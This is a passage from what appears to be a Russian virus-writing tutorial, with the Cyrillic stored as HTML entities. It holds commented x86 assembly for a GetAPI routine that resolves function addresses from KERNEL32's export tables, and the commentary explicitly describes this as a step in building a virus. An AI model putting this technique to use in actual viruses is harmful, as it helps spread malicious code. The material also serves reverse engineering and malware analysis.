 ; RVA, &#1084;&#1099; &#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1091;&#1077;&#1084; &#1077;&#1075;&#1086;.                                                 ;
 ;                                                                          ;
 ; &#1044;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077; &#1087;&#1086;&#1089;&#1084;&#1086;&#1090;&#1088;&#1080;&#1084;, &#1095;&#1090;&#1086; &#1075;&#1086;&#1074;&#1086;&#1088;&#1080;&#1090; &#1052;&#1101;&#1090;&#1090; &#1055;&#1080;&#1090;&#1088;&#1077;&#1082; &#1086; &#1087;&#1077;&#1088;&#1074;&#1086;&#1084; &#1087;&#1086;&#1083;&#1077;:                ;
 ;                                                                          ;
 ; &quot;&#1069;&#1090;&#1086; &#1087;&#1086;&#1083;&#1077; &#1103;&#1074;&#1083;&#1103;&#1077;&#1090;&#1089;&#1103; RVA &#1080; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074; &#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081;, &#1082;&#1072;&#1078;&#1076;&#1099;&#1081;     ;
 ; &#1101;&#1083;&#1077;&#1084;&#1077;&#1085;&#1090; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1075;&#1086; &#1103;&#1074;&#1083;&#1103;&#1077;&#1090;&#1089;&#1103; RVA &#1086;&#1076;&#1085;&#1086;&#1081; &#1080;&#1079; &#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1080;&#1088;&#1091;&#1077;&#1084;&#1099;&#1093; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081; &#1074; &#1076;&#1072;&#1085;&#1085;&#1086;&#1084;   ;
 ; &#1084;&#1086;&#1076;&#1091;&#1083;&#1077;.&quot;                                                                 ;
 ;                                                                          ;
 ; &#1048; &#1085;&#1072;&#1082;&#1086;&#1085;&#1077;&#1094;, &#1084;&#1099; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1084; &#1077;&#1075;&#1086; &#1074; &#1089;&#1086;&#1086;&#1090;&#1074;&#1077;&#1090;&#1089;&#1090;&#1074;&#1091;&#1102;&#1097;&#1077;&#1081; &#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1086;&#1081;. &#1044;&#1072;&#1083;&#1077;&#1077; &#1084;&#1099;       ;
 ; &#1076;&#1086;&#1083;&#1078;&#1085;&#1099; &#1091;&#1079;&#1085;&#1072;&#1090;&#1100; &#1072;&#1076;&#1088;&#1077;&#1089; &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1077;&#1081; &#1085;&#1072; &#1080;&#1084;&#1077;&#1085;&#1072;. &#1052;&#1101;&#1090;&#1090; &#1055;&#1080;&#1090;&#1088;&#1077;&#1082; &#1086;&#1073;&#1098;&#1103;&#1089;&#1085;&#1103;&#1077;&#1090;   ;
 ; &#1101;&#1090;&#1086; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1080;&#1084; &#1086;&#1073;&#1088;&#1072;&#1079;&#1086;&#1084;:                                                   ;
 ;                                                                          ;
 ; &quot;&#1069;&#1090;&#1086; &#1087;&#1086;&#1083;&#1077; - RVA &#1080; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1077;&#1081; &#1085;&#1072; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080;. &#1057;&#1090;&#1088;&#1086;&#1082;&#1080;       ;
 ; &#1103;&#1074;&#1083;&#1103;&#1102;&#1090;&#1089;&#1103; &#1080;&#1084;&#1077;&#1085;&#1072;&#1084;&#1080; &#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1080;&#1088;&#1091;&#1077;&#1084;&#1099;&#1093; &#1076;&#1072;&#1085;&#1085;&#1099;&#1084; &#1084;&#1086;&#1076;&#1091;&#1083;&#1077;&#1084; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081;&quot;.                 ;
 ;                                                                          ;
 ; &#1053;&#1086; &#1103; &#1085;&#1077; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1102; &#1077;&#1075;&#1086; &#1074; &#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1086;&#1081;, &#1072; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1102; &#1074; &#1089;&#1090;&#1077;&#1082;, &#1090;&#1072;&#1082; &#1082;&#1072;&#1082; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1091;&#1102;   ;
 ; &#1077;&#1075;&#1086; &#1086;&#1095;&#1077;&#1085;&#1100; &#1089;&#1082;&#1086;&#1088;&#1086;. &#1054;&#1082;, &#1085;&#1072;&#1082;&#1086;&#1085;&#1077;&#1094; &#1084;&#1099; &#1087;&#1077;&#1088;&#1077;&#1093;&#1086;&#1076;&#1080;&#1084; &#1082; &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077; &#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1086;&#1074;, &#1074;&#1086;&#1090; &#1095;&#1090;&#1086;   ;
 ; &#1075;&#1086;&#1074;&#1086;&#1088;&#1080;&#1090; &#1086;&#1073; &#1101;&#1090;&#1086;&#1084; &#1052;&#1101;&#1090;&#1090; &#1055;&#1080;&#1090;&#1088;&#1077;&#1082;:                                             ;
 ;                                                                          ;
 ; &quot;&#1069;&#1090;&#1086; &#1087;&#1086;&#1083;&#1077; - RVA &#1080; &#1086;&#1085;&#1086; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; &#1085;&#1072; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074; WORD&#1086;&#1074;. WORD'&#1099; &#1103;&#1074;&#1083;&#1103;&#1102;&#1090;&#1089;&#1103;        ;
 ; &#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1072;&#1084;&#1080; &#1074;&#1089;&#1077;&#1093; &#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1080;&#1088;&#1091;&#1077;&#1084;&#1099;&#1093; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081; &#1074; &#1076;&#1072;&#1085;&#1085;&#1086;&#1084; &#1084;&#1086;&#1076;&#1091;&#1083;&#1077;&quot;.                 ;
 ;                                                                          ;
 ; &#1054;&#1082;, &#1101;&#1090;&#1086; &#1090;&#1086;, &#1095;&#1090;&#1086; &#1084;&#1099; &#1089;&#1076;&#1077;&#1083;&#1072;&#1083;&#1080;.                                              ;
 ;-------------------------------------;

 @_3:   push    esi                             ; Save ESI for l8r restore
        lodsd                                   ; Get value ptr ESI in EAX
        add     eax,[ebp+kernel]                ; Normalize
        mov     esi,eax                         ; ESI = VA of API name
        mov     edi,edx                         ; EDI = ptr to wanted API
        push    ecx                             ; ECX = API size
        cld                                     ; Clear direction flag
        rep     cmpsb                           ; Compare both API names
        pop     ecx                             ; Restore ECX
        jz      @_4                             ; Jump if APIs are 100% equal
        pop     esi                             ; Restore ESI
        add     esi,4                           ; And get next value of array
        inc     word ptr [ebp+Counter]          ; Increase counter
        jmp     @_3                             ; Loop again

 ;-------------------------------------;
 ; &#1061;&#1077;&#1093;, &#1101;&#1090;&#1086; &#1085;&#1077; &#1074; &#1084;&#1086;&#1077;&#1084; &#1089;&#1090;&#1080;&#1083;&#1077; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1090;&#1100; &#1089;&#1083;&#1080;&#1096;&#1082;&#1086;&#1084; &#1084;&#1085;&#1086;&#1075;&#1086; &#1082;&#1086;&#1076;&#1072; &#1073;&#1077;&#1079; &#1082;&#1086;&#1084;&#1084;&#1077;&#1085;&#1090;&#1072;&#1088;&#1080;&#1077;&#1074;,   ;
 ; &#1082;&#1072;&#1082; &#1103; &#1087;&#1086;&#1089;&#1090;&#1091;&#1087;&#1080;&#1083; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1095;&#1090;&#1086;, &#1085;&#1086; &#1101;&#1090;&#1086;&#1090; &#1073;&#1083;&#1086;&#1082; &#1082;&#1086;&#1076;&#1072; &#1085;&#1077;&#1083;&#1100;&#1079;&#1103; &#1088;&#1072;&#1079;&#1076;&#1077;&#1083;&#1080;&#1090;&#1100; &#1073;&#1077;&#1079; &#1091;&#1097;&#1077;&#1088;&#1073;&#1072; ;
 ; &#1076;&#1083;&#1103; &#1077;&#1075;&#1086; &#1086;&#1073;&#1098;&#1103;&#1089;&#1085;&#1077;&#1085;&#1080;&#1103;. &#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; ESI &#1074; &#1089;&#1090;&#1077;&#1082; (&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1073;&#1091;&#1076;&#1077;&#1090;        ;
 ; &#1080;&#1079;&#1084;&#1077;&#1085;&#1077;&#1085; &#1080;&#1085;&#1089;&#1090;&#1088;&#1091;&#1082;&#1094;&#1080;&#1077;&#1081; CMPSB) &#1076;&#1083;&#1103; &#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1077;&#1075;&#1086; &#1074;&#1086;&#1089;&#1089;&#1090;&#1072;&#1085;&#1086;&#1074;&#1083;&#1077;&#1085;&#1080;&#1103;. &#1055;&#1086;&#1089;&#1083;&#1077; &#1101;&#1090;&#1086;&#1075;&#1086;  ;
 ; &#1084;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; DWORD, &#1085;&#1072; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; ESI (&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1072; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1077;&#1081; &#1085;&#1072;       ;
 ; &#1080;&#1084;&#1077;&#1085;&#1072;) &#1074; &#1087;&#1088;&#1080;&#1077;&#1084;&#1085;&#1080;&#1082; (EAX). &#1042;&#1089;&#1077; &#1101;&#1090;&#1086; &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1103;&#1077;&#1090;&#1089;&#1103; &#1089; &#1087;&#1086;&#1084;&#1086;&#1097;&#1100;&#1102; &#1080;&#1085;&#1089;&#1090;&#1088;&#1091;&#1082;&#1094;&#1080;&#1080; LODSD. ;
 ; &#1052;&#1099; &#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1091;&#1077;&#1084; &#1077;&#1077;, &#1076;&#1086;&#1073;&#1072;&#1074;&#1083;&#1103;&#1103; &#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1072;&#1079;&#1099; &#1103;&#1076;&#1088;&#1072;. &#1061;&#1086;&#1088;&#1086;&#1096;&#1086;, &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1091; &#1085;&#1072;&#1089; &#1074; EAX  ;
 ; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1080;&#1084;&#1103; &#1086;&#1076;&#1085;&#1086;&#1081; &#1080;&#1079; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081; API, &#1085;&#1086; &#1084;&#1099; &#1077;&#1097;&#1077; &#1085;&#1077; &#1079;&#1085;&#1072;&#1077;&#1084;, &#1095;&#1090;&#1086; ;
 ; &#1101;&#1090;&#1086; &#1079;&#1072; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103;. &#1053;&#1072;&#1087;&#1088;&#1080;&#1084;&#1077;&#1088; EAX &#1084;&#1086;&#1078;&#1077;&#1090; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1090;&#1100; &#1085;&#1072; &#1095;&#1090;&#1086;-&#1085;&#1080;&#1073;&#1091;&#1076;&#1100; &#1074;&#1088;&#1086;&#1076;&#1077;         ;
 ; &quot;CreateProcessA&quot; &#1080; &#1101;&#1090;&#1086; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103; &#1076;&#1083;&#1103; &#1085;&#1072;&#1096;&#1077;&#1075;&#1086; &#1074;&#1080;&#1088;&#1091;&#1089;&#1072; &#1085;&#1077;&#1080;&#1085;&#1090;&#1077;&#1088;&#1077;&#1089;&#1085;&#1072;... &#1051;&#1072;&#1076;&#1085;&#1086;,   ;
 ; &#1076;&#1083;&#1103; &#1089;&#1088;&#1072;&#1074;&#1085;&#1080;&#1103; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080; &#1089; &#1090;&#1086;&#1081;, &#1082;&#1086;&#1090;&#1086;&#1088;&#1072;&#1103; &#1085;&#1072;&#1084; &#1085;&#1091;&#1078;&#1085;&#1072; (&#1085;&#1072; &#1085;&#1077;&#1077; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; EDX), &#1091;    ;
 ; &#1085;&#1072;&#1089; &#1077;&#1089;&#1090;&#1100; CMPSB. &#1055;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1084;&#1099; &#1087;&#1086;&#1076;&#1075;&#1086;&#1090;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; &#1077;&#1077; &#1087;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099;: &#1074; ESI &#1084;&#1099;         ;
 ; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1085;&#1072;&#1095;&#1072;&#1083;&#1086; &#1089;&#1088;&#1072;&#1074;&#1085;&#1080;&#1074;&#1072;&#1077;&#1084;&#1086;&#1075;&#1086; &#1080;&#1084;&#1077;&#1085;&#1080; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;, &#1072; &#1074; EDI -      ;
 ; &#1085;&#1091;&#1078;&#1085;&#1086; &#1085;&#1072;&#1084; &#1080;&#1084;&#1103;. &#1042; ECX &#1084;&#1099; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; &#1077;&#1077; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088;, &#1072; &#1079;&#1072;&#1090;&#1077;&#1084; &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1103;&#1077;&#1084; &#1087;&#1086;&#1073;&#1072;&#1081;&#1090;&#1086;&#1074;&#1086;&#1077; ;
 ; &#1089;&#1088;&#1072;&#1074;&#1085;&#1077;&#1085;&#1080;&#1077;. &#1045;&#1089;&#1083;&#1080; &#1086;&#1073;&#1077; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080; &#1089;&#1086;&#1074;&#1087;&#1072;&#1076;&#1072;&#1102;&#1090; &#1076;&#1088;&#1091;&#1075; &#1089; &#1076;&#1088;&#1091;&#1075;&#1086;&#1084;, &#1091;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1090;&#1089;&#1103;      ;
 ; &#1092;&#1083;&#1072;&#1075; &#1085;&#1091;&#1083;&#1103; &#1080; &#1084;&#1099; &#1087;&#1077;&#1088;&#1077;&#1093;&#1086;&#1076;&#1080;&#1084; &#1082; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103; &#1072;&#1076;&#1088;&#1077;&#1089;&#1072; &#1101;&#1090;&#1086;&#1081; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;.  ;
 ; &#1042; &#1087;&#1088;&#1086;&#1090;&#1080;&#1074;&#1085;&#1086;&#1084; &#1089;&#1083;&#1091;&#1095;&#1072;&#1077; &#1084;&#1099; &#1074;&#1086;&#1089;&#1089;&#1090;&#1072;&#1085;&#1072;&#1074;&#1083;&#1080;&#1074;&#1072;&#1077;&#1084; ESI &#1080; &#1076;&#1086;&#1073;&#1072;&#1074;&#1083;&#1103;&#1077;&#1084; &#1082; &#1085;&#1077;&#1084;&#1091; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088;      ;
 ; DWORD, &#1095;&#1090;&#1086;&#1073;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1077;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1074; &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1077;&#1081; &#1085;&#1072; &#1080;&#1084;&#1077;&#1085;&#1072;.  ;
 ; &#1052;&#1099; &#1087;&#1086;&#1074;&#1099;&#1096;&#1072;&#1077;&#1084; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082;&#1072; (&#1054;&#1063;&#1045;&#1053;&#1068; &#1042;&#1040;&#1046;&#1053;&#1054;) &#1080; &#1087;&#1088;&#1086;&#1076;&#1086;&#1083;&#1078;&#1072;&#1077;&#1084; &#1087;&#1086;&#1080;&#1089;&#1082;.          ;
 ;-------------------------------------;

 @_4:   pop     esi                             ; Avoid shit in stack
        movzx   eax,word ptr [ebp+Counter]      ; Get in AX the counter
        shl     eax,1                           ; EAX = AX * 2
        add     eax,dword ptr [ebp+OrdinalTableVA] ; Normalize
        xor     esi,esi                         ; Clear ESI
        xchg    eax,esi                         ; EAX = 0, ESI = ptr to Ord
        lodsw                                   ; Get Ordinal in AX
        shl     eax,2                           ; EAX = AX * 4
        add     eax,dword ptr [ebp+AddressTableVA] ; Normalize
        mov     esi,eax                         ; ESI = ptr to Address RVA
        lodsd                                   ; EAX = Address RVA
        add     eax,[ebp+kernel]                ; Normalize and all is done.
        ret

 ;-------------------------------------;
 ; &#1055;&#1092;&#1092;&#1092;, &#1077;&#1097;&#1077; &#1086;&#1076;&#1080;&#1085; &#1086;&#1075;&#1088;&#1086;&#1084;&#1085;&#1099;&#1081; &#1073;&#1083;&#1086;&#1082; &#1082;&#1086;&#1076;&#1072; &#1080;, &#1087;&#1086;&#1093;&#1086;&#1078;&#1077;, &#1085;&#1077; &#1086;&#1095;&#1077;&#1085;&#1100; &#1087;&#1086;&#1085;&#1103;&#1090;&#1085;&#1099;&#1081;, &#1090;&#1072;&#1082;      ;
 ; &#1074;&#1077;&#1076;&#1100;? &#1053;&#1077; &#1073;&#1077;&#1089;&#1087;&#1086;&#1082;&#1086;&#1081;&#1090;&#1077;&#1089;&#1100;, &#1103; &#1087;&#1088;&#1086;&#1082;&#1086;&#1084;&#1084;&#1077;&#1085;&#1090;&#1080;&#1088;&#1091;&#1102; &#1077;&#1075;&#1086; ;).                          ;
 ; Pop &#1089;&#1083;&#1091;&#1078;&#1080;&#1090; &#1076;&#1083;&#1103; &#1086;&#1095;&#1080;&#1097;&#1077;&#1085;&#1080;&#1103; &#1089;&#1090;&#1077;&#1082;&#1072;. &#1047;&#1072;&#1090;&#1077;&#1084; &#1084;&#1099; &#1076;&#1074;&#1080;&#1075;&#1072;&#1077;&#1084; &#1074; &#1085;&#1080;&#1078;&#1085;&#1102;&#1102; &#1095;&#1072;&#1089;&#1090;&#1100; EAX       ;
 ; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082;&#1072; (&#1090;&#1072;&#1082; &#1082;&#1072;&#1082; &#1101;&#1090;&#1086; WORD) &#1080; &#1086;&#1073;&#1085;&#1091;&#1083;&#1103;&#1077;&#1090; &#1074;&#1077;&#1088;&#1093;&#1085;&#1102;&#1102; &#1074;&#1099;&#1096;&#1077;&#1091;&#1087;&#1086;&#1084;&#1103;&#1085;&#1091;&#1090;&#1086;&#1075;&#1086;  ;
 ; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1072;. &#1052;&#1099; &#1091;&#1084;&#1085;&#1086;&#1078;&#1072;&#1077;&#1084; &#1077;&#1075;&#1086; &#1085;&#1072; &#1076;&#1074;&#1072;, &#1090;&#1072;&#1082; &#1082;&#1072;&#1082; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074;, &#1074; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1084; &#1084;&#1099; &#1073;&#1091;&#1076;&#1077;&#1084;     ;
 ; &#1087;&#1088;&#1086;&#1074;&#1086;&#1076;&#1080;&#1090;&#1100; &#1087;&#1086;&#1080;&#1089;&#1082; &#1089;&#1086;&#1089;&#1090;&#1086;&#1080;&#1090; &#1080;&#1079; WORD'&#1086;&#1074;. &#1058;&#1077;&#1087;&#1077;&#1088;&#1100; &#1084;&#1099; &#1076;&#1086;&#1073;&#1072;&#1074;&#1083;&#1103;&#1077;&#1084; &#1082; &#1085;&#1077;&#1084;&#1091; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; ;
 ; &#1085;&#1072; &#1085;&#1072;&#1095;&#1072;&#1083;&#1086; &#1084;&#1072;&#1089;&#1089;&#1080;&#1074;&#1072;, &#1075;&#1076;&#1077; &#1084;&#1099; &#1093;&#1086;&#1090;&#1080;&#1084; &#1080;&#1089;&#1082;&#1072;&#1090;&#1100;. &#1055;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1084;&#1099; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; EAX &#1074; ESI,   ;
 ; &#1095;&#1090;&#1086;&#1073;&#1099; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100; &#1101;&#1090;&#1086;&#1090; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1076;&#1083;&#1103; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1103;, &#1085;&#1072; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1077; &#1086;&#1085;  ;
 ; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090;, &#1089; &#1087;&#1086;&#1084;&#1086;&#1097;&#1100;&#1102; &#1087;&#1088;&#1086;&#1089;&#1090;&#1086; LODSW. &#1061;&#1077;&#1093;, &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1091; &#1085;&#1072;&#1089; &#1077;&#1089;&#1090;&#1100; &#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;, &#1085;&#1086; &#1090;&#1086;,;
 ; &#1095;&#1090;&#1086; &#1084;&#1099; &#1093;&#1086;&#1090;&#1080;&#1084; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100; - &#1101;&#1090;&#1086; &#1090;&#1086;&#1095;&#1082;&#1072; &#1074;&#1093;&#1086;&#1076;&#1072; &#1074; &#1082;&#1086;&#1076; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API, &#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1084;&#1099;    ;
 ; &#1091;&#1084;&#1085;&#1086;&#1078;&#1072;&#1077;&#1084; &#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083; (&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1080;&#1090; &#1087;&#1086;&#1079;&#1080;&#1094;&#1080;&#1102; &#1090;&#1086;&#1095;&#1082;&#1080; &#1074;&#1093;&#1086;&#1076;&#1072; &#1078;&#1077;&#1083;&#1072;&#1077;&#1084;&#1086;&#1081; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;) ;
 ; &#1085;&#1072; 4 (&#1101;&#1090;&#1086; &#1088;&#1072;&#1079;&#1084;&#1077;&#1088; DWORD), &#1080; &#1091; &#1085;&#1072;&#1089; &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1077;&#1089;&#1090;&#1100; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; RVA &#1086;&#1090;&#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;   ;
 ; RVA &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099; &#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;, &#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1084;&#1099; &#1087;&#1088;&#1086;&#1080;&#1079;&#1074;&#1086;&#1076;&#1080;&#1084; &#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1072;&#1094;&#1080;&#1102;, &#1072; &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1074; EAX  ;
 ; &#1091; &#1085;&#1072;&#1089; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100; &#1085;&#1072; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1090;&#1086;&#1095;&#1082;&#1080; &#1074;&#1093;&#1086;&#1076;&#1072; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API &#1074; &#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077;  ;
 ; &#1072;&#1076;&#1088;&#1077;&#1086;&#1089;&#1074;. &#1052;&#1099; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; EAX &#1074; ESO &#1080; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077;, &#1085;&#1072; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1077; &#1091;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090; ;
 ; EAX. &#1058;&#1072;&#1082;&#1080;&#1084; &#1086;&#1073;&#1088;&#1072;&#1079;&#1086;&#1084; &#1074; &#1101;&#1090;&#1086;&#1084; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1077; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; RVA &#1090;&#1086;&#1095;&#1082;&#1080; &#1074;&#1093;&#1086;&#1076;&#1072; &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1084;&#1086;&#1081;   ;
 ; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;. &#1061;&#1077;&#1093;, &#1089;&#1077;&#1081;&#1095;&#1072;&#1089; &#1084;&#1099; &#1076;&#1086;&#1083;&#1078;&#1085;&#1099; &#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1080;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100; &#1101;&#1090;&#1086;&#1090; &#1072;&#1076;&#1088;&#1077;&#1089; &#1086;&#1090;&#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086; ;
 ; &#1073;&#1072;&#1079;&#1099; &#1086;&#1073;&#1088;&#1072;&#1079;&#1072; KERNEL32 &#1080; &#1074;&#1091;&#1072;&#1083;&#1103; - &#1074;&#1089;&#1077; &#1089;&#1076;&#1077;&#1083;&#1072;&#1085;&#1086;, &#1091; &#1085;&#1072;&#1089; &#1074; EAX &#1077;&#1089;&#1090;&#1100; &#1085;&#1072;&#1089;&#1090;&#1086;&#1103;&#1097;&#1080;&#1081;   ;
 ; &#1088;&#1077;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081; &#1072;&#1076;&#1088;&#1077;&#1089; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;! ;)                                               ;
 ;-------------------------------------;

 GetAPI         endp

 ;-------------------------------------;
 ;-------------------------------------;

 GetAPIs        proc

 ;-------------------------------------;
 ; &#1054;&#1082;, &#1101;&#1090;&#1086; &#1082;&#1086;&#1076; &#1076;&#1083;&#1103; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103; &#1074;&#1089;&#1077;&#1093; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081;. &#1059; &#1076;&#1072;&#1085;&#1085;&#1086;&#1081; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1080;&#1077;   ;
 ; &#1087;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099;:                                                               ;
 ;                                                                          ;
